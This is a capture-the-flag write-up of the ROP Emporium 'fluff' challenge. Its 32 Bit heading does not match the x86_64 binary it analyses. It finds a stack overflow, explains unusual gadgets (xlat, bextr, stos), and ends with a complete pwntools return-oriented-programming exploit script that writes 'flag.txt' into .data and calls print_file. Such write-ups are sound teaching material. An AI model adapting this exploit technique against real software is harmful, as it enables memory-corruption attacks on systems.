# fluff - 32 Bit
Program execution:
```
fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> <input_here>
```
Run checksec: `checksec ./fluff`
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```
Again, `main` call `pwnme`, which is defined in the given libfluff.so.

Disassembling libfluff.so shows that `pwnme` unsafely reads too many (0x200) bytes in to a 32 byte buffer at `rbp-0x20`:
```assembly
0000091e  lea     rax, [rbp-0x20 {var_28}]
00000922  mov     edx, 0x200
00000927  mov     rsi, rax {var_28}
0000092a  mov     edi, 0x0
0000092f  call    read
```

Like in the last challenge, there is a `print_file` function which will print a file specified by the string argument (filename string address). So we want to pass "flag.txt" into this function.
Running `rabin2 -z fluff` reveals that there is no flag.txt string:
```
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006c4 0x004006c4 11  12   .rodata ascii nonexistent
```
Let's find a writeable area of memory, where we can write our "flag.txt" string.
`readelf -S fluff`:
```
There are 29 section headers, starting at offset 0x1980:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400238  00000238
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.ABI-tag     NOTE             0000000000400254  00000254
       0000000000000020  0000000000000000   A       0     0     4
  [ 3] .note.gnu.build-i NOTE             0000000000400274  00000274
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298
       0000000000000038  0000000000000000   A       5     0     8
  [ 5] .dynsym           DYNSYM           00000000004002d0  000002d0
       00000000000000f0  0000000000000018   A       6     1     8
  [ 6] .dynstr           STRTAB           00000000004003c0  000003c0
       000000000000007b  0000000000000000   A       0     0     1
  [ 7] .gnu.version      VERSYM           000000000040043c  0000043c
       0000000000000014  0000000000000002   A       5     0     2
  [ 8] .gnu.version_r    VERNEED          0000000000400450  00000450
       0000000000000020  0000000000000000   A       6     1     8
  [ 9] .rela.dyn         RELA             0000000000400470  00000470
       0000000000000030  0000000000000018   A       5     0     8
  [10] .rela.plt         RELA             00000000004004a0  000004a0
       0000000000000030  0000000000000018  AI       5    22     8
  [11] .init             PROGBITS         00000000004004d0  000004d0
       0000000000000017  0000000000000000  AX       0     0     4
  [12] .plt              PROGBITS         00000000004004f0  000004f0
       0000000000000030  0000000000000010  AX       0     0     16
  [13] .text             PROGBITS         0000000000400520  00000520
       0000000000000192  0000000000000000  AX       0     0     16
  [14] .fini             PROGBITS         00000000004006b4  000006b4
       0000000000000009  0000000000000000  AX       0     0     4
  [15] .rodata           PROGBITS         00000000004006c0  000006c0
       0000000000000010  0000000000000000   A       0     0     4
  [16] .eh_frame_hdr     PROGBITS         00000000004006d0  000006d0
       0000000000000044  0000000000000000   A       0     0     4
  [17] .eh_frame         PROGBITS         0000000000400718  00000718
       0000000000000120  0000000000000000   A       0     0     8
  [18] .init_array       INIT_ARRAY       0000000000600df0  00000df0
       0000000000000008  0000000000000008  WA       0     0     8
  [19] .fini_array       FINI_ARRAY       0000000000600df8  00000df8
       0000000000000008  0000000000000008  WA       0     0     8
  [20] .dynamic          DYNAMIC          0000000000600e00  00000e00
       00000000000001f0  0000000000000010  WA       6     0     8
  [21] .got              PROGBITS         0000000000600ff0  00000ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000028  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
  [25] .comment          PROGBITS         0000000000000000  00001038
       0000000000000029  0000000000000001  MS       0     0     1
  [26] .symtab           SYMTAB           0000000000000000  00001068
       0000000000000618  0000000000000018          27    46     8
  [27] .strtab           STRTAB           0000000000000000  00001680
       00000000000001fb  0000000000000000           0     0     1
  [28] .shstrtab         STRTAB           0000000000000000  0000187b
       0000000000000103  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)
```

So we know we need to write "flag.txt" to .data, but what ROP gadgets can we use to achieve that? We need to find `mov` gadgets that work with memory address (`[reg]` notation), ideally. First let's see what `mov` gadgets we get to work with at all.
`ropper -f fluff --search 'mov'`:
```
[INFO] File: fluff
0x00000000004005e2: mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x0000000000400606: mov dword ptr [rbp + 0x48], edx; mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret;
0x0000000000400610: mov eax, 0; pop rbp; ret;
0x00000000004004d5: mov eax, dword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax;
0x00000000004004d5: mov eax, dword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax; add rsp, 8; ret;
0x0000000000400609: mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret;
0x00000000004005db: mov ebp, esp; call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x0000000000400619: mov ebp, esp; mov edi, 0x4006c4; call 0x510; nop; pop rbp; ret;
0x000000000040061b: mov edi, 0x4006c4; call 0x510; nop; pop rbp; ret;
0x000000000040057c: mov edi, 0x601038; jmp rax;
0x00000000004004d4: mov rax, qword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax;
0x00000000004004d4: mov rax, qword ptr [rip + 0x200b1d]; test rax, rax; je 0x4e2; call rax; add rsp, 8; ret;
0x0000000000400608: mov rbp, rsp; call 0x500; mov eax, 0; pop rbp; ret;
0x00000000004005da: mov rbp, rsp; call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x0000000000400618: mov rbp, rsp; mov edi, 0x4006c4; call 0x510; nop; pop rbp; ret;
```
Not a whole lot to work with here, so let's see what's in the hinted `questionableGadgets` function:
`objdump -d -Mintel --disassemble=questionableGadgets fluff`:
```
0000000000400628 <questionableGadgets>:
  400628:       d7                      xlat   BYTE PTR ds:[rbx]
  400629:       c3                      ret
  40062a:       5a                      pop    rdx
  40062b:       59                      pop    rcx
  40062c:       48 81 c1 f2 3e 00 00    add    rcx,0x3ef2
  400633:       c4 e2 e8 f7 d9          bextr  rbx,rcx,rdx
  400638:       c3                      ret
  400639:       aa                      stos   BYTE PTR es:[rdi],al
  40063a:       c3                      ret
  40063b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]
```
Some weird gadgets but this might just be enough for us to work with.

A bit of useful x86 context is that an operand like `es:[rdi]` represents the format of `segment:offset`. The first (segment) register contains the base address of a segment and the 2nd register contains an offset (in real mode, address = segment\*0x10 + offset). In protected mode (used by user-level apps), there is paging done for things like virtual memory. And in most modern day 32 bit and 64 bit OS, we either immitate a flat memory structure by having the segment registers set to 0 (32 bit) or we don't use the segment register (64 bit), with some exceptions for backwards compatibility.

Gadget `400639` is a `stos` which will let us store the byte in `al` into the address stored in `rdi`. We can use this to write a character of our string to `.data`. **Note: `rdi` will also be incremented**

`ropper -f fluff --search 'pop rdi'`:
```
[INFO] File: fluff
0x00000000004006a3: pop rdi; ret;
```
We have a `pop rdi` gadget to get the `.data` address into `rdi` for our `stos`.

To load the character into `al` to begin with, we could use gadget `400628`. `xlat` will set `al` to the contents at the address specified by (instruction operand + `al`), or `[rbx + al]` in this case.

We can then use the other weird gadget starting at `40062a` which uses `bextr` to set our `rbx`. Bits 7:0 of `rdx` (indexed from lsb) will specify the starting index from which we will copy data from `rcx`. Bits 15:8 of `rdx` will specify the length or number of bits to copy from `rcx` (starting from starting index) and into `rbx`.

Bits 7:0 will be 00000000 so we copy from index 0, and bits 15:8 will be 01000000 so we copy 64 bits from `rcx` to `rbx`. This means we need to load `0x4000` into `rdx`.

We'll need to set `rcx` such that when accounting for the addition of `0x3ef2` (instruction 40062c), it (when added to `al` later) represents an address for one of our `flag.txt` characters. This means we can't just put `flag.txt` to the stack, but we'll have to find the characters from within the binary or .so library file.

One other issue is since `[rbx + al]` is used to set `al` during the `xlat` instruction, we'll need to know what `al` is at first. Alternatively we can just set it to 0.
`ropper -f fluff --search 'mov eax, 0'`:
```
[INFO] File: fluff
0x0000000000400610: mov eax, 0; pop rbp; ret;
```

And putting all this together:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./fluff"
p = process(PROG_NAME)
elf = p.elf

if args.ATTACH:
    gdb.attach(p, '''break main''')

data_addr = 0x00601028
mov_eax_0_pop_rbp_addr = 0x00400610     # mov eax, 0; pop rbp; ret;
pop_rdi_addr = 0x004006a3               # pop rdi; ret;

pop_rdx_rcx_bextr_rbx_addr = 0x0040062a # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
xlat_ptr_rbx_addr = 0x00400628          # xlat BYTE PTR ds:[rbx]
stos_ptr_rdi_al_addr = 0x00400639       # stos BYTE PTR es:[rdi],al

p.recvuntil(b'> ')
payload = b'A' * (0x20 + 0x8)

# only need to set al (eax) to 0 once
# and set rdi to our .data address once
payload += p64(mov_eax_0_pop_rbp_addr)
payload += p64(1337)
payload += p64(pop_rdi_addr)
payload += p64(data_addr)

al = 0 # start at zero after out `mov eax, 0`
for i, c in enumerate('flag.txt'):
    char_addr = next(elf.search(c.encode()))
    payload += p64(pop_rdx_rcx_bextr_rbx_addr)

    # 0x4000 = 0100 0000 0000 0000
    # bits 7:0 starting index to copy = 0
    # bits 15:8 number of bits to copy = 64
    payload += p64(0x4000)

    # magic number and al will get added to address later
    payload += p64(char_addr - 0x3ef2 - al)
    payload += p64(xlat_ptr_rbx_addr)
    payload += p64(stos_ptr_rdi_al_addr)
    al = ord(c)

    # at this point *(.data+i) = c,
    # and rdi is incremented for next loop thanks to `stos`

# with our .data set up, we can call print_file
payload += p64(pop_rdi_addr)
payload += p64(data_addr)
payload += p64(elf.symbols['print_file'])

p.sendline(payload)
p.interactive()

```

And we get the flag:
```
Thank you!
ROPE{a_placeholder_32byte_flag!}
```